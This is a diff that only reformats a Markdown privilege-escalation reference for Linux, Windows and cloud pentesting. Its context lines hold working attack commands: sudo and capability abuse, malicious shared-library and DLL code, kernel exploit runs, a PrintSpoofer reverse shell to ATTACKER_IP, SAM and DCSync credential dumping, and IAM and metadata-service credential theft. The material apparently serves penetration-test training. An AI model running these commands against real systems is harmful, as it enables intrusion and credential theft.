@@ -4,9 +4,9 @@
 
 | | |
 |---|---|
-| **Read this when** | You have a low-privilege foothold and need to reach root or SYSTEM, you are prepping for OSCP/HTB/CTF privesc, you need to map a technique to its ATT&CK ID |
-| **Start at** | [Linux Initial Enumeration](#initial-enumeration), [Windows Initial Enumeration](#initial-enumeration-1), [Automated Tools](#_5-automated-tools) |
-| **Pairs with** | [Pentest Checklists](PENTEST_CHECKLISTS.md), [Cloud Attack Reference](CLOUD_ATTACK_REFERENCE.md), [HTB Machine Index](research/HTB_MACHINE_INDEX.md) |
+| Read this when | You have a low-privilege foothold and need to reach root or SYSTEM, you are prepping for OSCP/HTB/CTF privesc, you need to map a technique to its ATT&CK ID |
+| Start at | [Linux Initial Enumeration](#initial-enumeration), [Windows Initial Enumeration](#initial-enumeration-1), [Automated Tools](#_5-automated-tools) |
+| Pairs with | [Pentest Checklists](PENTEST_CHECKLISTS.md), [Cloud Attack Reference](CLOUD_ATTACK_REFERENCE.md), [HTB Machine Index](research/HTB_MACHINE_INDEX.md) |
 
 ---
 
@@ -145,7 +145,7 @@ Check `sudo -l` for entries that allow commands without a password or with explo
 sudo -l
 ```
 
-**Example vulnerable sudo -l output:**
+Example vulnerable sudo -l output:
 
 ```
 (ALL) NOPASSWD: /bin/bash
@@ -157,7 +157,7 @@ sudo -l
 (root) NOPASSWD: /opt/scripts/*.sh
 ```
 
-**Exploitation examples:**
+Exploitation examples:
 
 ```bash
 # NOPASSWD bash
@@ -210,7 +210,7 @@ watch -n 1 "ps aux | grep cron"
 ./pspy64
 ```
 
-**Exploitation — overwrite a world-writable cron script:**
+Exploitation — overwrite a world-writable cron script:
 
 ```bash
 # Confirm the script is writable
@@ -271,7 +271,7 @@ getcap -r / 2>/dev/null
 # cap_net_raw    — raw socket access
 ```
 
-**Exploitation — `cap_setuid+ep` on Python/Perl/Ruby:**
+Exploitation — `cap_setuid+ep` on Python/Perl/Ruby:
 
 ```bash
 # Python3 with cap_setuid+ep
@@ -284,7 +284,7 @@ perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash"'
 ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
 ```
 
-**Exploitation — `cap_dac_read_search` on tar:**
+Exploitation — `cap_dac_read_search` on tar:
 
 ```bash
 # Read /etc/shadow with tar
@@ -327,7 +327,7 @@ When `sudo` is configured with `env_keep+=LD_PRELOAD`, a shared library injected
 sudo -l
 ```
 
-**Compile the malicious shared library:**
+Compile the malicious shared library:
 
 ```c
 // shell.c
@@ -400,7 +400,7 @@ cat /proc/version
 # PwnKit (CVE-2021-4034)     — pkexec SUID privesc, glibc-based systems
 ```
 
-**DirtyCOW (CVE-2016-5195):**
+DirtyCOW (CVE-2016-5195):
 
 ```bash
 # Compile and run
@@ -411,7 +411,7 @@ su firefart
 # Password: newpassword
 ```
 
-**Dirty Pipe (CVE-2022-0847):**
+Dirty Pipe (CVE-2022-0847):
 
 ```bash
 # Compile and run
@@ -419,7 +419,7 @@ gcc -o dirtypipe dirtypipe.c
 ./dirtypipe /usr/bin/sudo 1 "$(python3 -c 'print("A"*8)')"
 ```
 
-**PwnKit (CVE-2021-4034):**
+PwnKit (CVE-2021-4034):
 
 ```bash
 # Compile and run
@@ -498,7 +498,7 @@ Get-WmiObject -Class Win32_Service |
   Select-Object Name, PathName, StartMode
 ```
 
-**Exploitation:**
+Exploitation:
 
 ```
 Service Path: C:\Program Files\Some App\service.exe
@@ -565,7 +565,7 @@ Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name Alway
 Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
 ```
 
-**Exploitation:**
+Exploitation:
 
 ```bash
 # On Kali — generate malicious MSI with msfvenom
@@ -596,7 +596,7 @@ DLL Search Order:
 6. Directories in %PATH%
 ```
 
-**Finding missing DLLs with Process Monitor:**
+Finding missing DLLs with Process Monitor:
 
 ```
 Filter:
@@ -605,7 +605,7 @@ Filter:
   Process Name is target.exe
 ```
 
-**Compile a malicious DLL (Windows C example):**
+Compile a malicious DLL (Windows C example):
 
 ```c
 // evil.c — compiled with MinGW or MSVC
@@ -662,7 +662,7 @@ reg save HKLM\SYSTEM C:\Temp\SYSTEM
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 
-**Interesting file locations:**
+Interesting file locations:
 
 ```
 C:\Windows\sysprep\sysprep.xml
@@ -711,20 +711,20 @@ whoami /priv
 :: SeAssignPrimaryTokenPrivilege       Enabled
 ```
 
-**PrintSpoofer (Windows 10/Server 2019):**
+PrintSpoofer (Windows 10/Server 2019):
 
 ```cmd
 PrintSpoofer.exe -i -c cmd
 PrintSpoofer.exe -c "nc.exe ATTACKER_IP 4444 -e cmd"
 ```
 
-**JuicyPotato (older Windows, requires CLSID):**
+JuicyPotato (older Windows, requires CLSID):
 
 ```cmd
 JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {CLSID}
 ```
 
-**GodPotato (Windows Server 2012–2022, Windows 8–11):**
+GodPotato (Windows Server 2012-2022, Windows 8-11):
 
 ```cmd
 GodPotato -cmd "cmd /c whoami"
@@ -749,7 +749,7 @@ icacls "C:\Program Files\VulnApp\task.exe"
 accesschk.exe -qwvu "Everyone" "C:\Program Files\VulnApp\task.exe" /accepteula
 ```
 
-**Exploitation — replace a writable task binary:**
+Exploitation — replace a writable task binary:
 
 ```cmd
 :: Confirm writable
@@ -781,7 +781,7 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 ```
 
-**Check binary permissions:**
+Check binary permissions:
 
 ```cmd
 :: Note the binary path from reg query output, then check permissions
@@ -885,7 +885,7 @@ lsadump::dcsync /domain:DOMAIN /user:krbtgt
 
 ## 4. Cloud Privilege Escalation
 
-Cloud privilege escalation differs from traditional OS privesc — instead of exploiting binaries or kernel flaws, attackers abuse **over-permissioned IAM identities**, **misconfigured role trust relationships**, **service account keys**, and **metadata service access**. The goal is the same: move from lower-privilege access to one that allows full control, credential exfiltration, or lateral movement.
+Cloud privilege escalation differs from traditional OS privesc — instead of exploiting binaries or kernel flaws, attackers abuse over-permissioned IAM identities, misconfigured role trust relationships, service account keys, and metadata service access. The goal is the same: move from lower-privilege access to one that allows full control, credential exfiltration, or lateral movement.
 
 ---
 
@@ -893,7 +893,7 @@ Cloud privilege escalation differs from traditional OS privesc — instead of ex
 
 AWS privilege escalation exploits [IAM policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html) and [STS role assumptions](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html). A misconfigured permission on a single IAM action can be enough to reach `AdministratorAccess`.
 
-**Enumerate current identity and permissions:**
+Enumerate current identity and permissions:
 
 ```bash
 # Who am I?
@@ -913,7 +913,7 @@ aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
 aws iam get-role --role-name TARGET_ROLE
 ```
 
-**Key IAM escalation paths:**
+Key IAM escalation paths:
 
 | IAM Permission | Escalation Method |
 |---|---|
@@ -929,7 +929,7 @@ aws iam get-role --role-name TARGET_ROLE
 | `iam:UpdateLoginProfile` | Reset console password for an existing IAM user |
 | `iam:CreateAccessKey` | Create access keys for another IAM user |
 
-**AttachUserPolicy escalation:**
+AttachUserPolicy escalation:
 
 ```bash
 # Attach the AWS managed AdministratorAccess policy to your own user
@@ -941,7 +941,7 @@ aws iam attach-user-policy \
 aws iam list-attached-user-policies --user-name YOUR_USERNAME
 ```
 
-**PassRole + Lambda escalation:**
+PassRole + Lambda escalation:
 
 ```bash
 # Create a Lambda function that exfiltrates credentials or assumes a privileged role
@@ -969,7 +969,7 @@ aws lambda invoke --function-name privesc-func output.txt
 cat output.txt
 ```
 
-**EC2 instance metadata — retrieve IAM role credentials:**
+EC2 instance metadata — retrieve IAM role credentials:
 
 ```bash
 # From inside an EC2 instance — IMDSv1 (no token required)
@@ -985,7 +985,7 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" \
   http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
 ```
 
-**Automated AWS privesc scanning:**
+Automated AWS privesc scanning:
 
 ```bash
 # Enumerate IAM permissions with enumerate-iam
@@ -1004,9 +1004,9 @@ python3 pacu.py
 
 ### Azure
 
-Azure privilege escalation typically involves abusing **Azure RBAC role assignments**, **Azure AD application permissions**, **managed identities**, and the **Azure Instance Metadata Service (IMDS)**.
+Azure privilege escalation typically involves abusing Azure RBAC role assignments, Azure AD application permissions, managed identities, and the Azure Instance Metadata Service (IMDS).
 
-**Enumerate current identity and roles:**
+Enumerate current identity and roles:
 
 ```bash
 # Azure CLI — current identity
@@ -1024,7 +1024,7 @@ az ad group list --output table
 az ad group member list --group GROUP_ID
 ```
 
-**Azure RBAC escalation — Owner or User Access Administrator:**
+Azure RBAC escalation — Owner or User Access Administrator:
 
 If you have `Owner`, `User Access Administrator`, or `Microsoft.Authorization/roleAssignments/write` permission, you can grant yourself additional roles.
 
@@ -1042,7 +1042,7 @@ az role assignment create \
   --scope "/subscriptions/SUB_ID/resourceGroups/RG_NAME"
 ```
 
-**Azure Managed Identity abuse — from a VM:**
+Azure Managed Identity abuse — from a VM:
 
 ```bash
 # From inside an Azure VM — query IMDS for access token
@@ -1055,7 +1055,7 @@ curl -X GET "https://management.azure.com/subscriptions?api-version=2020-01-01" 
   -H "Authorization: Bearer $TOKEN"
 ```
 
-**Azure AD application privilege escalation:**
+Azure AD application privilege escalation:
 
 ```bash
 # List service principals and their app role assignments
@@ -1071,7 +1071,7 @@ az ad app permission list --id APP_ID
 az ad sp credential reset --id SP_OBJECT_ID
 ```
 
-**PowerShell-based Azure AD enumeration (AzureAD / Az module):**
+PowerShell-based Azure AD enumeration (AzureAD / Az module):
 
 ```powershell
 # Connect
@@ -1092,15 +1092,15 @@ Get-AzureADDirectoryRole | ForEach-Object {
 Get-AzureADServicePrincipal -All $true | Select-Object DisplayName, AppId, ObjectId
 ```
 
-> Reference: [Azure Privilege Escalation via Azure API Permissions Abuse](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48) · [MicroBurst](https://github.com/NetSPI/MicroBurst)
+> Reference: [Azure Privilege Escalation via Azure API Permissions Abuse](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48), [MicroBurst](https://github.com/NetSPI/MicroBurst)
 
 ---
 
 ### GCP
 
-GCP privilege escalation often involves **service account key creation**, **workload identity impersonation**, **IAM role binding manipulation**, and **GCE metadata server access**.
+GCP privilege escalation often involves service account key creation, workload identity impersonation, IAM role binding manipulation, and GCE metadata server access.
 
-**Enumerate current identity and IAM permissions:**
+Enumerate current identity and IAM permissions:
 
 ```bash
 # Current identity
@@ -1120,7 +1120,7 @@ gcloud projects get-iam-policy PROJECT_ID \
   --format="value(bindings.role)"
 ```
 
-**Service account key creation (if `iam.serviceAccountKeys.create` is granted):**
+Service account key creation (if `iam.serviceAccountKeys.create` is granted):
 
 ```bash
 # Create a JSON key for a privileged service account
@@ -1135,7 +1135,7 @@ gcloud auth list
 gcloud config get-value account
 ```
 
-**IAM role binding escalation (if `resourcemanager.projects.setIamPolicy` is granted):**
+IAM role binding escalation (if `resourcemanager.projects.setIamPolicy` is granted):
 
 ```bash
 # Grant yourself Owner on the project
@@ -1144,7 +1144,7 @@ gcloud projects add-iam-policy-binding PROJECT_ID \
   --role "roles/owner"
 ```
 
-**GCE metadata server — retrieve service account token:**
+GCE metadata server — retrieve service account token:
 
 ```bash
 # From inside a GCE instance
@@ -1164,14 +1164,14 @@ curl -H "Authorization: Bearer $TOKEN" \
   "https://cloudresourcemanager.googleapis.com/v1/projects"
 ```
 
-**Workload identity impersonation:**
+Workload identity impersonation:
 
 ```bash
 # If you can impersonate a service account (roles/iam.serviceAccountTokenCreator)
 gcloud auth print-access-token --impersonate-service-account PRIVILEGED_SA@PROJECT_ID.iam.gserviceaccount.com
 ```
 
-> Reference: [GCP IAM Privilege Escalation — Dylan Ayrey (GitLab Security)](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/) · [GCP IAM Escalation Techniques — Rhino Security Labs](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
+> Reference: [GCP IAM Privilege Escalation — Dylan Ayrey (GitLab Security)](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/), [GCP IAM Escalation Techniques — Rhino Security Labs](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
 
 ---
 
@@ -1181,17 +1181,17 @@ gcloud auth print-access-token --impersonate-service-account PRIVILEGED_SA@PROJE
 |------|----------|-------|
 | linPEAS | Linux | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
 | winPEAS | Windows | `winpeas.exe` or `winpeas.bat` |
-| Linux Exploit Suggester | Linux | `./les.sh` — matches kernel CVEs |
+| Linux Exploit Suggester | Linux | `./les.sh`: matches kernel CVEs |
 | Windows Exploit Suggester | Windows | `python3 wesng.py --update && python3 wesng.py systeminfo.txt` |
 | PowerUp | Windows PS | `Import-Module PowerUp.ps1; Invoke-AllChecks` |
 | PrivescCheck | Windows PS | `Import-Module PrivescCheck.ps1; Invoke-PrivescCheck` |
 | GTFOBins | Linux | [gtfobins.github.io](https://gtfobins.github.io) |
 | LOLBAS | Windows | [lolbas-project.github.io](https://lolbas-project.github.io) |
-| Pacu | AWS | `python3 pacu.py` — AWS exploitation and IAM privesc scanning |
+| Pacu | AWS | `python3 pacu.py`: AWS exploitation and IAM privesc scanning |
 | enumerate-iam | AWS | `python3 enumerate-iam.py --access-key KEY --secret-key SECRET` |
 | MicroBurst | Azure | PowerShell-based Azure enumeration and privesc |
-| ScoutSuite | Multi-cloud | `python3 scout.py aws` — cloud security posture auditing |
-| CloudSploit | Multi-cloud | [github.com/aquasecurity/cloudsploit](https://github.com/aquasecurity/cloudsploit) — misconfiguration scanner |
+| ScoutSuite | Multi-cloud | `python3 scout.py aws`: cloud security posture auditing |
+| CloudSploit | Multi-cloud | [github.com/aquasecurity/cloudsploit](https://github.com/aquasecurity/cloudsploit): misconfiguration scanner |
 
 ```bash
 # linPEAS — full run with color output
@@ -1476,4 +1476,4 @@ Get-AzRoleAssignment | Where-Object {$_.RoleDefinitionName -eq "Owner"}
 | Pacu (AWS exploitation) | [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu) |
 | AWS IAM Privesc Methods | [rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) |
 | MicroBurst (Azure) | [github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst) |
-| GCP Privesc — Rhino Security | [rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/) |
+| GCP Privesc: Rhino Security | [rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/) |
